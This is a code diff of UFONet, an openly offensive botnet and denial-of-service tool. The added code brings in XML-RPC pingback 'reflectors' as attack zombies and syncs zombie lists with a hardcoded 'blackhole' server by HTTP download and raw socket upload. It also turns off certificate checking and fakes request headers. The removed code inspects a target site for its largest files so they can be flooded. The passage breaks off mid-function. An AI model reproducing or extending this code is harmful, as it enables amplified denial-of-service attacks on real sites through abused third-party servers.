@@ -16,11 +16,13 @@ from update import Updater
 from herd import Herd
 from zombie import Zombie
 from doll import Doll
+from inspector import Inspector
 
 DEBUG = 0
 
 class UFONet(object):
     def __init__(self):
+        self.blackhole = '176.28.23.46' # default download/upload zombies 'blackhole'
         self.mothership_ids = [] # generating name/id for your mothership ;-)
         self.mothership_ids.append(base64.urlsafe_b64encode('avalon'))
         self.mothership_ids.append(base64.urlsafe_b64encode('cruiser'))
@@ -32,9 +34,11 @@ class UFONet(object):
         self.mothership_ids.append(base64.urlsafe_b64encode('manhattan'))
         self.mothership_ids.append(base64.urlsafe_b64encode('skywalker'))
         self.mothership_ids.append(base64.urlsafe_b64encode('defender'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('mp19'))
         self.mothership_ids.append(base64.urlsafe_b64encode('casiopea'))
         self.mothership_ids.append(base64.urlsafe_b64encode('orion'))
         self.mothership_ids.append(base64.urlsafe_b64encode('pluto'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('iku'))
         self.mothership_ids.append(base64.urlsafe_b64encode('cosmic banana'))
         self.mothership_ids.append(base64.urlsafe_b64encode('lucio'))
         self.mothership_ids.append(base64.urlsafe_b64encode('gladio'))
@@ -49,6 +53,12 @@ class UFONet(object):
         self.mothership_ids.append(base64.urlsafe_b64encode('KIC8462852'))
         self.mothership_ids.append(base64.urlsafe_b64encode('cygnus'))
         self.mothership_ids.append(base64.urlsafe_b64encode('lyra'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('space riot'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('nexus'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('gotomah'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('planet squater'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('tyranna'))
+        self.mothership_ids.append(base64.urlsafe_b64encode('CTB37A'))
         self.mothership_id = random.choice(self.mothership_ids).strip()
         self.mothership_hash = random.getrandbits(128) # generating random evasion hash 
         self.search_engines = [] # available dorking search engines
@@ -99,6 +109,7 @@ class UFONet(object):
         self.aliens_file = 'botnet/aliens.txt' # set source path to retrieve 'aliens'
         self.droids_file = 'botnet/droids.txt' # set source path to retrieve 'droids'
         self.ucavs_file = 'botnet/ucavs.txt' # set source path to retrieve 'ucavs'
+        self.rpcs_file = 'botnet/rpcs.txt' # set source path to retrieve 'rpcs'
         self.mothership_stats_file = 'stats.json' # set source for mothership stats
         self.referer = 'http://127.0.0.1/'
         self.head = False
@@ -112,7 +123,6 @@ class UFONet(object):
         self.herd = Herd(self)
         self.sem = False
         self.port = "8080" # default UFONet injection port
-        self.blackhole = '176.28.23.46' # download/upload zombies destination
         self.db_flash = 0 # db stress counter
         self.total_aliens = 0 
         self.aliens_hit = 0
@@ -123,6 +133,12 @@ class UFONet(object):
         self.total_ucavs = 0
         self.ucavs_hit = 0
         self.ucavs_fail = 0
+        self.total_rpcs = 0
+        self.rpcs_hit = 0
+        self.rpcs_fail = 0
+        self.ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
+        self.ctx.check_hostname = False
+        self.ctx.verify_mode = ssl.CERT_NONE
 
     def create_options(self, args=None):
         self.optionParser = UFONetOptions()
@@ -181,11 +197,20 @@ class UFONet(object):
 
         # check tor connection
         if options.checktor:
+            url = 'https://check.torproject.org' # TOR status checking site
             self.banner()
+            print "\nSending request to: " + url + "\n"
+            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             try:
-                print("\nSending request to: https://check.torproject.org\n")
-                tor_reply = urllib2.urlopen("https://check.torproject.org").read()
-                your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                    req = urllib2.Request(url, None, headers)
+                    tor_reply = urllib2.urlopen(req).read()
+                else:
+                    req = urllib2.Request(url, None, headers)
+                    tor_reply = urllib2.urlopen(req, context=self.ctx).read()
+                your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip() # extract public IP
                 if not tor_reply or 'Congratulations' not in tor_reply:
                     print("It seems that Tor is not properly set.\n")
                     print("Your IP address appears to be: " + your_ip + "\n")
@@ -194,6 +219,41 @@ class UFONet(object):
                     print("Your IP address appears to be: " + your_ip + "\n")
             except:
                 print("Cannot reach TOR checker system!. Are you correctly connected?\n")
+                sys.exit(2) # return
+
+        # run AES256+HMAC-SHA1 enc/dec tool
+        if options.cryptomsg:
+            from server.crypter import Cipher
+            from base64 import b64encode, b64decode
+            print "                                          "
+            print "        ____...------------...____        "
+            print "   _.-'' /o/__ ____ __ __  __ \o\_`'-._   "
+            print " .'     / /                    \ \     '. "
+            print " |=====/o/======================\o\=====| "
+            print " |____/_/________..____..________\_\____| "
+            print " /   _/ \_     <_o#\__/#o_>     _/ \_   \ "
+            print " \__/_____\####/__________/####/_____\__/ "
+            print "  |===\!/========================\!/===|  "
+            print "  |   |=|          .---.         |=|   |  "
+            print "  |===|o|=========/     \========|o|===|  "
+            print "  |   | |         \() ()/        | |   |  "
+            print "  |===|o|======{'-.) A (.-'}=====|o|===|  "
+            print "  | __/ \__     '-.\uuu/.-'    __/ \__ |  "
+            print "  |==== .'.'^'.'.====|====.'.'^'.'.====|  "
+            print "  |  _\o/   __  {.' __  '.} _   _\o/  _|  "
+            print "  ''''''''''''''''''''''''''''''''''''''  "
+            print "\nUFONet Crypter (AES256+HMAC-SHA1)\n"
+            print " -> (140 plain text chars = 69 encrypted chars)\n"
+            text = str(raw_input("- Enter text: "))
+            input_key = str(raw_input("- Enter key: "))
+            key = b64encode(input_key)
+            c = Cipher(key, text)
+            msg = c.encrypt()
+            c.set_text(msg)
+            print '\n-> Ciphertext: [', msg, ']'
+            print '\nLength:', len(msg)
+            print '\n-> Key (share it using SNEAKNET!):', input_key
+            print '\nDecryption PoC:', c.decrypt(), "\n"
 
         # search for 'zombies' on search engines results
         if options.search:
@@ -303,7 +363,19 @@ class UFONet(object):
             except Exception:
                 print ("\n[Error] - Something wrong testing!\n")
                 traceback.print_exc()
- 
+
+        # test XML-'rpc' pingback vulnerable servers -> update list
+        if options.testrpc:
+            try:
+                self.banner()
+                rpcs = self.extract_rpcs()
+                if not rpcs:
+                    return
+                testrpc = self.testing_rpcs(rpcs)
+            except Exception:
+                print ("\n[Error] - Something wrong testing XML-RPC servers!\n")
+                traceback.print_exc()
+
         # attack target -> exploit Open Redirect massively and conduct vulnerable servers to a target
         if options.target:
             try:
@@ -322,7 +394,8 @@ class UFONet(object):
                 self.banner()
                 print("\nInspecting target to find the best place to attack... SSssh!\n")
                 print '='*22 + '\n'
-                inspection = self.inspecting()
+                self.instance = Inspector(self) # instance main class for inspection operations
+                inspection = self.instance.inspecting(options.inspect)
             except Exception, e:
                 traceback.print_exc()
                 print ("\n[Error] - Something wrong inspecting... Not any object found!\n")
@@ -444,15 +517,34 @@ class UFONet(object):
                 return #sys.exit(2)
 
     # starting new zombie thread
-    def connect_zombies(self,zombie): 
-        z=Zombie(self,zombie)
+    def connect_zombies(self, zombie): 
+        z=Zombie(self, zombie)
         t = threading.Thread(target=z.connect, name=zombie)
         t.start()
 
     # single connection handling
-    def connect_zombie(self,zombie): 
+    def connect_zombie(self, zombie): 
         z=Zombie(self,zombie)
         return z.connect()
+
+    def extract_proxy(self, proxy):
+        sep = ":"
+        proxy_ip = proxy.rsplit(sep, 1)[0]
+        if proxy_ip.startswith('http://'):
+            proxy_ip = proxy_ip.replace('http://', '')
+        elif proxy_ip.startswith('https://'):
+            proxy_ip = proxy_ip.replace('https://', '')
+        if proxy_ip == '127.0.0.1': # working by using 'localhost' as http proxy (privoxy, ...)
+            proxy_ip = 'localhost'
+        proxy_port = proxy.rsplit(sep, 1)[1]
+        proxy_url = proxy_ip + ":" + proxy_port # ex: localhost:8118
+        return proxy_url
+
+    def proxy_transport(self, proxy):
+        proxy_url = self.extract_proxy(proxy)
+        proxy = urllib2.ProxyHandler({'https': proxy_url})
+        opener = urllib2.build_opener(proxy)
+        urllib2.install_opener(opener)
 
     def update_mothership_stats(self):
         import json
@@ -492,6 +584,7 @@ class UFONet(object):
         troops = "troops.txt.gz"
         robots = "robots.txt.gz"
         drones = "drones.txt.gz"
+        reflectors = "reflectors.txt.gz"
         try:
             print("Checking integrity of 'blackhole'...\n")
             urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
@@ -502,6 +595,8 @@ class UFONet(object):
                     robots)
             urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
                     drones)
+            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
+                    reflectors)
             print("Vortex: IS READY!")
             f_in_abductions = gzip.open(abductions, 'rb')
             f_out_abductions = open('abductions.txt', 'wb')
@@ -547,6 +642,17 @@ class UFONet(object):
                 for _ in f:
                     num_drones = num_drones + 1
             print("[Info] - 'Drones' on 'blackhole' : "+ str(num_drones))
+            f_in_reflectors = gzip.open(reflectors, 'rb')
+            f_out_reflectors = open('reflectors.txt', 'wb')
+            f_out_reflectors.write(f_in_reflectors.read())
+            f_in_reflectors.close()
+            f_out_reflectors.close()
+            os.remove(reflectors) # remove .gz file
+            num_reflectors = 0
+            with open('reflectors.txt') as f:
+                for _ in f:
+                    num_reflectors = num_reflectors + 1
+            print("[Info] - 'X-RPCs' on 'blackhole' : "+ str(num_reflectors))
             print '-'*12 + '\n'
             if not self.options.forceyes:
                 update_reply = raw_input("Wanna merge ONLY new 'zombies' on server (Y/n)")
@@ -558,6 +664,7 @@ class UFONet(object):
                 os.remove('troops.txt') # remove troops file
                 os.remove('robots.txt') # remove robots file
                 os.remove('drones.txt') # remove drones file
+                os.remove('reflectors.txt') # remove reflectors file
                 print "\n[Info] - Aborting upload process and cleaning temporal files. Bye!\n"
                 return
             else:
@@ -644,12 +751,33 @@ class UFONet(object):
                     else:
                         pass
                 print("[Info] - New 'drones' found : " + str(ucavs_added))
+                rpcs = self.extract_rpcs()
+                if not ucavs:
+                    return
+                rpcs_community = []
+                rpcs_added = 0
+                f = open('reflectors.txt')
+                reflectors = f.readlines()
+                reflectors = [reflector.strip() for reflector in reflectors]
+                f.close()
+                fz = open(self.rpcs_file)
+                rpcs = fz.readlines()
+                rpcs = [rpc.strip() for rpc in rpcs]
+                fz.close()
+                for rpc in rpcs:
+                    if rpc not in reflectors:
+                        rpcs_community.append(rpc)
+                        rpcs_added = rpcs_added + 1
+                    else:
+                        pass
+                print("[Info] - New 'X-RPCs' found : " + str(rpcs_added))
                 print '-'*12 + '\n'
-                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0: # not zombies of any type
+                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0 and rpcs_added == 0: # not zombies of any type
                     os.remove('abductions.txt') # remove abductions file
                     os.remove('troops.txt') # remove troops file
                     os.remove('robots.txt') # remove robots file
                     os.remove('drones.txt') # remove ucavs file
+                    os.remove('rpcs.txt') # remove rpcs file
                     print("[Info] - Hehehe.. You should try to search for new 'zombies'. These are already in this 'blackhole'. ;-)\n")
                     return
                 else:
@@ -673,9 +801,13 @@ class UFONet(object):
                         fc.write(ucav.strip()+"\n")
                     fc.close()
                     os.remove('drones.txt') # remove drones file
+                    fc = gzip.open('community_rpcs.txt.gz', 'wb')
+                    for rpc in rpcs_community:
+                        fc.write(rpc.strip()+"\n")
+                    fc.close()
+                    os.remove('reflectors.txt') # remove reflectors file
                     print("[Info] - Starting to upload new 'zombies'...\n")
                     try: # open a socket and send data to ufonet_community reciever
-                        import socket
                         host = self.blackhole 
                         cport = 9991
                         mport = 9990
@@ -731,6 +863,19 @@ class UFONet(object):
                             ms.send(data)
                             ms.close()
                             os.remove('community_ucavs.txt.gz') # remove local ucavs .gz file after transfer
+                            time.sleep(1)
+                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
+                            cs.connect((host, cport))
+                            cs.send("SEND " + 'community_rpcs.txt.gz')
+                            cs.close()
+                            f = open('community_rpcs.txt.gz', "rb")
+                            data = f.read()
+                            f.close()
+                            ms = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            ms.connect((host, mport))
+                            ms.send(data)
+                            ms.close()
+                            os.remove('community_rpcs.txt.gz') # remove local rpcs .gz file after transfer
                             time.sleep(2) # sleep a bit more
                             print '-'*12 + '\n'
                             print("[Info] - Transfer: DONE!. Thanks for your contribution ;-)\n")
@@ -742,15 +887,16 @@ class UFONet(object):
                         return
         except:
             print '-'*12 + '\n'
-            print("[Error] - Unable to upload list of 'zombies' to server. ;(\n")
+            print("[Error] - Unable to upload list of 'zombies' to this 'blackhole'. ;(\n")
             return #sys.exit(2)
 
-    def downloading_list(self): # add your mirror to protect zombies list
+    def downloading_list(self): # add your mirror to protect/share/distribute zombies
         import urllib, gzip
         abductions = "abductions.txt.gz"
         troops = "troops.txt.gz"
         robots = "robots.txt.gz"
         drones = "drones.txt.gz"
+        reflectors = "reflectors.txt.gz"
         try:
             print("Trying 'blackhole': "+self.blackhole+"\n")
             urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
@@ -761,11 +907,13 @@ class UFONet(object):
                    robots)
             urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
                    drones)
+            urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
+                   reflectors)
             print("Vortex: IS READY!")
         except:
             print("Vortex: FAILED!")
             print '-'*12 + '\n'
-            print("[Error] - Unable to download list of 'zombies' from 'blackhole' ;(\n")
+            print("[Error] - Unable to download list of 'zombies' from this 'blackhole'. ;(\n")
             return #sys.exit(2)
         print '-'*12 + '\n'
         f_in_abductions = gzip.open(abductions, 'rb')
@@ -791,7 +939,13 @@ class UFONet(object):
         f_out_drones.write(f_in_drones.read())
         f_in_drones.close()
         f_out_drones.close()
-        os.remove(drones) # remove drones .gz file
+        os.remove(drones) # remove reflectors .gz file
+        f_in_reflectors = gzip.open(reflectors, 'rb')
+        f_out_reflectors = open('reflectors.txt', 'wb')
+        f_out_reflectors.write(f_in_reflectors.read())
+        f_in_reflectors.close()
+        f_out_reflectors.close()
+        os.remove(reflectors) # remove reflectors .gz file
         num_abductions = 0
         with open('abductions.txt') as f:
             for _ in f:
@@ -811,9 +965,13 @@ class UFONet(object):
         with open('drones.txt') as f:
             for _ in f:
                 num_drones = num_drones + 1
-        print("[Info] - Drones : " + str(num_drones))
-
-        total_zombies = num_abductions + num_troops + num_robots + num_drones
+        print("[Info] - UCAVs : " + str(num_drones))
+        num_reflectors = 0
+        with open('reflectors.txt') as f:
+            for _ in f:
+                num_reflectors = num_reflectors + 1
+        print("[Info] - X-RPCs : " + str(num_reflectors))
+        total_zombies = num_abductions + num_troops + num_robots + num_drones + num_reflectors
         print("\n[Info] - Congratulations!. Total downloaded: " + str(total_zombies))
         print '-'*12
         if not self.options.forceyes:
@@ -826,6 +984,7 @@ class UFONet(object):
             os.remove('troops.txt') # remove troops file
             os.remove('robots.txt') # remove robots file
             os.remove('drones.txt') # remove drones file
+            os.remove('reflectors.txt') # remove reflectors file
             print "\n[Info] - List downloaded has been removed. Bye!\n"
         else:
             zombies_ready = []
@@ -888,6 +1047,21 @@ class UFONet(object):
                     pass
             self.update_ucavs(ucavs_ready)
             os.remove('drones.txt') # remove drones .txt file
+            rpcs_ready = []
+            f = open('reflectors.txt')
+            reflectors = f.readlines()
+            f.close()
+            fz = open(self.rpcs_file)
+            rpcs = fz.readlines()
+            fz.close()
+            for reflector in reflectors:
+                reflector = reflector.replace('\n','')
+                if reflector not in rpcs:
+                    rpcs_ready.append(reflector)
+                else:
+                    pass
+            self.update_rpcs(rpcs_ready)
+            os.remove('reflectors.txt') # remove reflectors .txt file
             print "\n[Info] - Botnet updated! ;-)\n"
 
     def create_web_interface(self):
@@ -916,786 +1090,6 @@ class UFONet(object):
 #        myurl = options.crawl
 #        for i in re.findall('''href=["'](.[^"']+)["']''', urllib.urlopen(myurl).read(), re.I):
 #            print i 
-
-    def inspecting(self):
-        # inspect HTML target's components sizes (ex: http://target.com/foo)           
-        # [images, .mov, .webm, .avi, .swf, .mpg, .mpeg, .mp3, .ogg, .ogv, 
-        # .wmv, .css, .js, .xml, .php, .html, .jsp, .asp, .txt]
-        options = self.options
-        biggest_files = {}
-        ctx = ssl.create_default_context() # creating context to bypass SSL cert validation (black magic)
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        try:
-            target = str(options.inspect)
-            if target.endswith(""):
-                target.replace("", "/")
-            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
-            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-            try:
-                req = urllib2.Request(target, None, headers)
-                target_reply = urllib2.urlopen(req, context=ctx).read()
-            except: 
-                print('[Error] - Unable to connect to target\n')
-                return #sys.exit(2)
-        except:
-            print '\n[Error] - Cannot found any object', "\n"
-            return #sys.exit(2)
-        #print target_reply
-        try: # search for image files
-            regex_img = []
-            regex_img1 = "<img src='(.+?)'" # search on target's results using regex with simple quotation
-            regex_img.append(regex_img1)
-            regex_img2 = '<img src="(.+?)"' # search on target's results using regex with double quotation
-            regex_img.append(regex_img2)
-            #regex_img3 = '<img src=(.+?)>' # search on target's results using regex without quotations
-            #regex_img.append(regex_img3)
-            for regimg in regex_img:
-                pattern_img = re.compile(regimg)
-                img_links = re.findall(pattern_img, target_reply)
-            imgs = {}
-            for img in img_links:
-                print('+Image found: ' + img)
-                try:
-                    if img.startswith('http'):
-                        img_file = urllib.urlopen(img)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        img_file = urllib2.urlopen(target_url + img, context=ctx)
-                    size = img_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(img_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Image)')
-                    size = 0
-                imgs[img] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print imgs
-            biggest_image = max(imgs.keys(), key=lambda x: imgs[x]) # search/extract biggest image value from dict
-            biggest_files[biggest_image] = imgs[biggest_image] # add biggest image to list
-        except: # if not any image found, go for next
-            pass
-        try: # search for .mov files
-            regex_mov = []
-            regex_mov1 = "<a href='(.+?.mov)'" # search on target's results using regex with simple quotation
-            regex_mov.append(regex_mov1)
-            regex_mov2 = '<a href="(.+?.mov)"' # search on target's results using regex with double quotation
-            regex_mov.append(regex_mov2)
-            #regex_mov3 = '<a href=(.+?.mov)' # search on target's results using regex without quotations
-            #regex_mov.append(regex_mov3)
-            for regmov in regex_mov:
-                pattern_mov = re.compile(regmov)
-                mov_links = re.findall(pattern_mov, target_reply)
-            movs = {}
-            for mov in mov_links:
-                print('+Video (.mov) found: ' + mov)
-                try:
-                    if mov.startswith('http'):
-                        mov_file = urllib.urlopen(mov)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        mov_file = urllib2.urlopen(target_url + mov, context=ctx)
-                    size = mov_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(mov_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                movs[mov] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print movs
-            biggest_mov = max(movs.keys(), key=lambda x: movs[x]) # search/extract biggest video (.mov) value from dict
-            biggest_files[biggest_mov] = movs[biggest_mov] # add biggest video (.mov) to list
-        except: # if not any .mov found, go for next
-            pass 
-        try: # search for .webm files
-            regex_webm = []
-            regex_webm1 = "<a href='(.+?.webm)'" # search on target's results using regex with simple quotation
-            regex_webm.append(regex_webm1)
-            regex_webm2 = '<a href="(.+?.webm)"' # search on target's results using regex with double quotation
-            regex_webm.append(regex_webm2)
-            #regex_webm3 = '<a href=(.+?.webm)' # search on target's results using regex without quotations
-            #regex_webm.append(regex_webm3)
-            for regwebm in regex_webm:
-                pattern_webm = re.compile(regwebm)
-                webm_links = re.findall(pattern_webm, target_reply)
-            webms = {}
-            for webm in webm_links:
-                print('+Video (.webm) found: ' + webm)
-                try:
-                    if webm.startswith('http'):
-                        webm_file = urllib.urlopen(webm)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        webm_file = urllib2.urlopen(target_url + webm, context=ctx)
-                    size = webm_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(webm_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                webms[webm] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print webms
-            biggest_webm = max(webms.keys(), key=lambda x: webms[x]) # search/extract biggest video (.webm) value from dict
-            biggest_files[biggest_webm] = webms[biggest_webm] # add biggest video (.webm) to list
-        except: # if not any .webm found, go for next
-            pass 
-        try: # search for .avi files
-            regex_avi = []
-            regex_avi1 = "<a href='(.+?.avi)'" # search on target's results using regex with simple quotation
-            regex_avi.append(regex_avi1)
-            regex_avi2 = '<a href="(.+?.avi)"' # search on target's results using regex with double quotation
-            regex_avi.append(regex_avi2)
-            #regex_avi3 = '<a href=(.+?.avi)' # search on target's results using regex without quotations
-            #regex_avi.append(regex_avi3)
-            for regavi in regex_avi:
-                pattern_avi = re.compile(regavi)
-                avi_links = re.findall(pattern_avi, target_reply)
-            avis = {}
-            for avi in avi_links:
-                print('+Video (.avi) found: ' + avi)
-                try:
-                    if avi.startswith('http'):
-                        avi_file = urllib.urlopen(avi)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        avi_file = urllib2.urlopen(target_url + avi, context=ctx)
-                    size = avi_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(avi_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                avis[avi] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print avis
-            biggest_avi = max(avis.keys(), key=lambda x: avis[x]) # search/extract biggest video (.avi) value from dict
-            biggest_files[biggest_avi] = avis[biggest_avi] # add biggest video (.avi) to list
-        except: # if not any .avi found, go for next
-            pass
-        try: # search for .swf files
-            regex_swf = []
-            regex_swf1 = "<value='(.+?.swf)'" # search on target's results using regex with simple quotation
-            regex_swf.append(regex_swf1)
-            regex_swf2 = '<value="(.+?.swf)"' # search on target's results using regex with double quotation
-            regex_swf.append(regex_swf2)
-            #regex_swf3 = '<value=(.+?.swf)' # search on target's results using regex without quotations
-            #regex_swf.append(regex_swf3)
-            for regswf in regex_swf:
-                pattern_swf = re.compile(regswf)
-                swf_links = re.findall(pattern_swf, target_reply)
-            swfs = {}
-            for swf in swf_links:
-                print('+Flash (.swf) found: ' + swf)
-                try:
-                    if swf.startswith('http'):
-                        swf_file = urllib.urlopen(swf)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        swf_file = urllib2.urlopen(target_url + swf, context=ctx)
-                    size = swf_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(swf_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Flash)')
-                    size = 0
-                swfs[swf] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print swfs
-            biggest_swf = max(swfs.keys(), key=lambda x: swfs[x]) # search/extract biggest flash (.swf) value from dict
-            biggest_files[biggest_swf] = swfs[biggest_swf] # add biggest flash (.swf) to list
-        except: # if not any .swf found, go for next
-            pass
-        try: # search for .mpg files
-            regex_mpg = []
-            regex_mpg1 = "<src='(.+?.mpg)'" # search on target's results using regex with simple quotation
-            regex_mpg.append(regex_mpg1)
-            regex_mpg2 = '<src="(.+?.mpg)"' # search on target's results using regex with double quotation
-            regex_mpg.append(regex_mpg2)
-            #regex_mpg3 = '<src=(.+?.mpg)' # search on target's results using regex without quotations
-            #regex_mpg.append(regex_mpg3)
-            for regmpg in regex_mpg:
-                pattern_mpg = re.compile(regmpg)
-                mpg_links = re.findall(pattern_mpg, target_reply)
-            mpgs = {}
-            for mpg in mpg_links:
-                print('+Video (.mpg) found: ' + mpg)
-                try:
-                    if mpg.startswith('http'):
-                        mpg_file = urllib.urlopen(mpg)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        mpg_file = urllib2.urlopen(target_url + mpg, context=ctx)
-                    size = mpg_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(mpg_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                mpgs[mpg] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print mpgs
-            biggest_mpg = max(mpgs.keys(), key=lambda x: mpgs[x]) # search/extract biggest video (.mpg) value from dict
-            biggest_files[biggest_mpg] = mpgs[biggest_mpg] # add biggest video (.mpg) to list
-        except: # if not any .mpg found, go for next
-            pass
-        try: # search for .mpeg files
-            regex_mpeg = []
-            regex_mpeg1 = "<src='(.+?.mpeg)'" # search on target's results using regex with simple quotation
-            regex_mpeg.append(regex_mpeg1)
-            regex_mpeg2 = '<src="(.+?.mpeg)"' # search on target's results using regex with double quotation
-            regex_mpeg.append(regex_mpeg2)
-            #regex_mpeg3 = '<src=(.+?.mpeg)' # search on target's results using regex without quotations
-            #regex_mpeg.append(regex_mpeg3)
-            for regmpeg in regex_mpeg:
-                pattern_mpeg = re.compile(regmpeg)
-                mpeg_links = re.findall(pattern_mpeg, target_reply)
-            mpegs = {}
-            for mpeg in mpeg_links:
-                print('+Video (.mpeg) found: ' + mpeg)
-                try:
-                    if mpeg.startswith('http'):
-                        mpeg_file = urllib.urlopen(mpeg)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        mpeg_file = urllib2.urlopen(target_url + mpeg, context=ctx)
-                    size = mpeg_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(mpeg_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                mpegs[mpeg] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print mpegs
-            biggest_mpeg = max(mpegs.keys(), key=lambda x: mpegs[x]) # search/extract biggest video (.mpeg) value from dict
-            biggest_files[biggest_mpeg] = mpegs[biggest_mpeg] # add biggest video (.mpeg) to list
-        except: # if not any .mpeg found, go for next
-            pass
-        try: # search for .mp3 files
-            regex_mp3 = []
-            regex_mp31 = "<src='(.+?.mp3)'" # search on target's results using regex with simple quotation
-            regex_mp3.append(regex_mp31)
-            regex_mp32 = '<src="(.+?.mp3)"' # search on target's results using regex with double quotation
-            regex_mp3.append(regex_mp32)
-            #regex_mp33 = '<src=(.+?.mp3)' # search on target's results using regex without quotations
-            #regex_mp3.append(regex_mp33)
-            for regmp3 in regex_mp3:
-                pattern_mp3 = re.compile(regmp3)
-                mp3_links = re.findall(pattern_mp3, target_reply)
-            mp3s = {}
-            for mp3 in mp3_links:
-                print('+Audio (.mp3) found: ' + mp3)
-                try:
-                    if mp3.startswith('http'):
-                        mp3_file = urllib.urlopen(mp3)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        mp3_file = urllib2.urlopen(target_url + mp3, context=ctx)
-                    size = mp3_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(mp3_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Audio)')
-                    size = 0
-                mp3s[mp3] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print mp3s
-            biggest_mp3 = max(mp3s.keys(), key=lambda x: mp3s[x]) # search/extract biggest audio (.mp3) value from dict
-            biggest_files[biggest_mp3] = mp3s[biggest_mp3] # add biggest audio (.mp3) to list
-        except: # if not any .mp3 found, go for next
-            pass
-        try: # search for .mp4 files
-            regex_mp4 = []
-            regex_mp41 = "<src='(.+?.mp4)'" # search on target's results using regex with simple quotation
-            regex_mp4.append(regex_mp41)
-            regex_mp42 = '<src="(.+?.mp4)"' # search on target's results using regex with double quotation
-            regex_mp4.append(regex_mp42)
-            #regex_mp43 = '<src=(.+?.mp4)' # search on target's results using regex without quotations
-            #regex_mp4.append(regex_mp43)
-            for regmp4 in regex_mp4:
-                pattern_mp4 = re.compile(regmp4)
-                mp4_links = re.findall(pattern_mp4, target_reply)
-            mp4s = {}
-            for mp4 in mp4_links:
-                print('+Video (.mp4) found: ' + mp4)
-                try:
-                    if mp4.startswith('http'):
